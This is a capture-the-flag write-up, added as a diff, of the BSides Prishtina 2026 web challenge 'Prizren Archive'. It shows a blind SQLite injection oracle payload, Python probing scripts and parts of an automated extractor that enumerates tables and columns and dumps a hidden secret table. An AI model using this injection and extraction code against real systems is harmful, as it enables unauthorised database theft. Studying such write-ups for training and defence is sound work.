@@ -1,0 +1,391 @@
+﻿---
+title: Prizren Archive
+summary: Web challenge writeup from BSides Prishtina 2026.
+tags: CTF Writeups, BSides Prishtina 2026, Web
+publishedAt: '2026-05-25'
+public: true
+language: "en"
+translationKey: "bsides-prishtina-2026-prizren-archive"
+---
+| Category                  | Difficulty | Points | Protocol     |
+| ------------------------- | ---------- | ------ | ------------ |
+| Web (SQLi, blind, sqlite) | Hard       | 650    | Web Instance |
+
+---
+# Introduction
+
+Some kind of public record-search portal for the Prizren Municipal Archive. The description dropped a hint that the clerk's "input filter" looked clean, but one row in the database was never meant to be seen publicly.
+
+The app had one endpoint worth caring about:
+
+```
+GET /search?q=<input>
+```
+
+No rows returned. No errors with details. Just three possible responses:
+
+```
+match
+no match
+query error
+```
+
+So yeah, blind. Let's go.
+
+---
+
+## Initial Endpoint Checks
+
+Opened the site first, just to see what it actually looked like. Standard archive search, one input box. Typed in a name fragment, I got `match`. Typed random garbage, got `no match`. Then threw in a single quote and it returned `query error`, which was enough to know the input was going raw into a query somewhere.
+
+From there I tried `Kras'||'niqi` in the browser, still `match`. SQLite string concatenation working through the input meant the backend was almost certainly doing something like:
+
+```sql
+name LIKE '%<input>%'
+```
+
+unescaped. At that point I moved to scripting it to go faster:
+
+```bash
+python3 - <<'PY'
+import requests
+url='http://challs.bsidesprishtina.org:30491/search'
+for q in ['Kras','zzzzzz',"'", "Kras'||'niqi"]:
+    r=requests.get(url, params={'q':q}, timeout=10)
+    print('Q=',repr(q),'status',r.status_code,'len',len(r.text))
+    print(r.text[:300].replace('\n',' '))
+PY
+```
+
+Output:
+
+```
+Q= 'Kras' status 200 len 5
+match
+Q= 'zzzzzz' status 200 len 8
+no match
+Q= "'" status 200 len 11
+query error
+Q= "Kras'||'niqi" status 200 len 5
+match
+```
+
+The script just confirms what the browser already showed, but now it's reproducible and I can build on it.
+
+---
+
+## Testing Comment And Expression Behavior
+
+Needed to know which comment styles survive and how the backend handles injected expressions.
+
+```bash
+python3 - <<'PY'
+import requests
+url='http://challs.bsidesprishtina.org:30491/search'
+for q in ["a/*", "a*/", "/*", "*/", "a--", "a#", "a/**/"]:
+    r=requests.get(url, params={'q':q}, timeout=10)
+    print(repr(q), r.status_code, repr(r.text[:80]))
+PY
+```
+
+Output:
+
+```
+'a/*' 200 'no match'
+'a*/' 200 'no match'
+'/*' 200 'no match'
+'*/' 200 'no match'
+'a--' 200 'match'
+'a#' 200 'no match'
+'a/**/' 200 'no match'
+```
+
+Comments alone don't really tell you much. What matters is putting them _after_ a valid injected expression to kill the rest of the backend's query.
+
+---
+
+## Finding The Blind Oracle
+
+This is where it gets interesting. I wanted to see if I could make the search pattern itself depend on a database value.
+
+```bash
+python3 - <<'PY'
+import requests
+url='http://challs.bsidesprishtina.org:30491/search'
+qs=[
+    "'||name/*",
+    "'||(name)/*",
+    "'||(case when 1 then name else '~' end)/*",
+    "'||(case when 0 then name else '~' end)/*",
+    "'||(iif(1,name,'~'))/*",
+    "'||(iif(0,name,'~'))/*",
+    "'||(select name from records limit 1)/*",
+]
+for q in qs:
+    r=requests.get(url, params={'q':q}, timeout=10)
+    print('\nQ=',q)
+    print(r.status_code,repr(r.text[:100]))
+PY
+```
+
+Output:
+
+```
+Q= '||name/*
+200 'match'
+
+Q= '||(name)/*
+200 'match'
+
+Q= '||(case when 1 then name else '~' end)/*
+200 'match'
+
+Q= '||(case when 0 then name else '~' end)/*
+200 'no match'
+
+Q= '||(iif(1,name,'~'))/*
+200 'match'
+
+Q= '||(iif(0,name,'~'))/*
+200 'no match'
+
+Q= '||(select name from records limit 1)/*
+200 'match'
+```
+
+There it is. The oracle:
+
+```sql
+'||(case when (<condition>) then name else '~' end)/*
+```
+
+How it works: if the condition is true, the expression returns `name`. The search pattern becomes the current row's own name, so the endpoint returns `match`. If the condition is false, it returns `~` which matches nothing so you get `no match`.
+
+The `/*` comments out whatever's left of the backend's SQL after the injection point.
+
+Final oracle form, using `char(126)` instead of a literal `~` to keep quoting clean:
+
+```sql
+'||(case when (<condition>) then name else char(126) end)/*
+```
+
+One bit of information per request. That's all we need.
+
+---
+
+## Verifying Reads From `sqlite_master`
+
+Confirmed the oracle works, now let's see if we can read metadata.
+
+```bash
+python3 - <<'PY'
+import requests
+url='http://challs.bsidesprishtina.org:30491/search'
+def o(cond):
+    q="'||(case when ("+cond+") then name else '~' end)/*"
+    r=requests.get(url, params={'q':q}, timeout=10)
+    return r.text, q
+for cond in [
+    "1",
+    "0",
+    "unicode(substr((select sql from sqlite_master where type='table' limit 1),1,1))=67",
+    "unicode(substr((select sql from sqlite_master where type='table' limit 1),1,1))=88",
+    "length((select sql from sqlite_master where type='table' limit 1))>0"
+]:
+    text,q=o(cond)
+    print(cond, '=>', repr(text))
+PY
+```
+
+Output:
+
+```
+1 => 'match'
+0 => 'no match'
+unicode(substr((select sql from sqlite_master where type='table' limit 1),1,1))=67 => 'match'
+unicode(substr((select sql from sqlite_master where type='table' limit 1),1,1))=88 => 'no match'
+length((select sql from sqlite_master where type='table' limit 1))>0 => 'match'
+```
+
+`67` = ASCII `C`, first character of `CREATE TABLE ...`. That's a hit. We can extract arbitrary scalar values from the database one bit at a time.
+
+---
+
+## Checking Table And Column Enumeration
+
+Tested `sqlite_master` for table count and `pragma_table_info()` for column names.
+
+```bash
+python3 - <<'PY'
+import requests
+url='http://challs.bsidesprishtina.org:30491/search'
+def oracle(cond):
+    q="'||(case when ("+cond+") then name else char(126) end)/*"
+    r=requests.get(url, params={'q':q}, timeout=10)
+    print(cond, repr(r.text[:80]))
+for cond in [
+    "(select count(*) from sqlite_master where type='table')>0",
+    "(select count(*) from sqlite_master where type='table')>1",
+    "unicode(substr((select group_concat(name,char(10)) from sqlite_master where type='table'),1,1))>0",
+]:
+    oracle(cond)
+PY
+```
+
+Output:
+
+```
+(select count(*) from sqlite_master where type='table')>0 'match'
+(select count(*) from sqlite_master where type='table')>1 'match'
+unicode(substr((select group_concat(name,char(10)) from sqlite_master where type='table'),1,1))>0 'match'
+```
+
+More than one table. Interesting. Then columns on the known `records` table:
+
+```bash
+python3 - <<'PY'
+import requests
+url='http://challs.bsidesprishtina.org:30491/search'
+def o(cond):
+    q="'||(case when ("+cond+") then name else char(126) end)/*"
+    return requests.get(url, params={'q':q}, timeout=10).text.strip()
+for cond in [
+    "length((select group_concat(name,char(10)) from pragma_table_info('records')))>0",
+    "unicode(substr((select group_concat(name,char(10)) from pragma_table_info('records')),1,1))=105"
+]:
+    print(cond, o(cond))
+PY
+```
+
+Output:
+
+```
+length((select group_concat(name,char(10)) from pragma_table_info('records')))>0 match
+unicode(substr((select group_concat(name,char(10)) from pragma_table_info('records')),1,1))=105 match
+```
+
+`105` = `i`, first letter of `id`. `pragma_table_info()` is reachable.
+
+---
+
+## Building The Extractor
+
+Wrote a full automated blind SQLite extractor at `web/prizren-archive/solve.py`.
+
+Core oracle function:
+
+```python
+def is_true(self, condition):
+    payload = f"'||(case when ({condition}) then name else char(126) end)/*"
+    r = self.session.get(self.url, params={"q": payload}, timeout=self.timeout)
+    body = r.text.strip()
+
+    if body == "match":
+        return True
+    if body == "no match":
+        return False
+    raise RuntimeError(f"unexpected response for {payload!r}: {body!r}")
+```
+
+The extractor does the following:
+
+1. Binary-searches integer values through the oracle
+2. Gets string lengths with `length(...)`
+3. Extracts each character with `unicode(substr(...))`
+4. Enumerates tables from `sqlite_master`
+5. Enumerates columns with `pragma_table_info('<table>')`
+6. Dumps rows with `limit 1 offset <n>`
+
+String extraction:
+
+```python
+def string_value(self, expr, max_len=None, max_code=PRINTABLE_MAX):
+    text_expr = f"coalesce(cast(({expr}) as text),'')"
+    length = max_len
+    if length is None:
+        length = self.int_value(f"length({text_expr})", 0, 512)
+
+    out = []
+    for pos in range(1, length + 1):
+        code = self.int_value(f"unicode(substr({text_expr},{pos},1))", 1, max_code)
+        out.append(chr(code))
+        print("\r" + "".join(out), end="", flush=True)
+    print()
+    return "".join(out)
+```
+
+---
+
+## Running The Solver
+
+```bash
+python3 web/prizren-archive/solve.py
+```
+
+Output:
+
+```
+[*] checking oracle
+[*] extracting table list
+records
+sqlite_sequence
+secret
+[+] tables: records, sqlite_sequence, secret
+
+[*] schema for secret
+CREATE TABLE secret (id INTEGER PRIMARY KEY, value TEXT)
+[+] CREATE TABLE secret (id INTEGER PRIMARY KEY, value TEXT)
+id
+value
+[+] columns: id, value
+[*] dumping 1/1 rows from secret
+1
+BSidesPR26{96f93a5d9979ce96c4be420b2ad87ff3}
+[row 0] id='1' | value='BSidesPR26{96f93a5d9979ce96c4be420b2ad87ff3}'
+
+[+] possible flag(s):
+BSidesPR26{96f93a5d9979ce96c4be420b2ad87ff3}
+[*] total oracle requests: 1033
+```
+
+There it is â€” a hidden `secret` table that wasn't showing up in the public-facing search. Schema was:
+
+```sql
+CREATE TABLE secret (id INTEGER PRIMARY KEY, value TEXT)
+```
+
+One row. One column. Flag.
+
+---
+
+## Final Solver Verification
+
+```bash
+chmod +x web/prizren-archive/solve.py
+python3 -m py_compile web/prizren-archive/solve.py
+```
+
+No output = clean compile.
+
+---
+
+## Why The Exploit Works
+
+The app builds a SQLite `LIKE` predicate by concatenating user input directly into the query string, unescaped. The injection closes the open quote, concatenates a conditional expression, and uses `/*` to comment out whatever the backend appends after the input.
+
+```sql
+'||(case when (<condition>) then name else char(126) end)/*
+```
+
+- Condition true â†’ expression returns a real name â†’ query matches â†’ `match`
+- Condition false â†’ expression returns `~` â†’ no rows match â†’ `no match`
+
+The app never exposes query results. Doesn't matter. One bit per request is enough. 1033 requests later you've got the full flag out of a table the app never intended to touch.
+
+---
+
+## Flag
+
+```
+BSidesPR26{96f93a5d9979ce96c4be420b2ad87ff3}
+```
